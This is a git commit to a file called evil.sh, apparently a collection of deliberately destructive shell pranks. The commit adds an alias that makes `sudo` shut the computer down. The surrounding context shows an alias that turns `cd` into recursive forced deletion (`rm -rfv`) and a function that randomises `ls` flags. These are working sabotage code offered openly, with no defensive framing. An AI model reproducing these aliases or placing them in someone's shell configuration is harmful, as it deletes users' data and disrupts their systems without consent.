bdf42c1ff17dea232501573a07ec70243e70dd38
Internetwache <github@internetwache.org>
2013-12-20 22:21:40 +0100

    Shut down the computer whenever `sudo` is used
    Closes #8.

--- evil.sh
+++ evil.sh
@@ -18,3 +18,6 @@ function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1})
 
 # Delete directories instead of entering them
 alias cd='rm -rfv'
+
+# Shut down the computer instead of running a command with super-user rights
+alias sudo='sudo shutdown -P now'
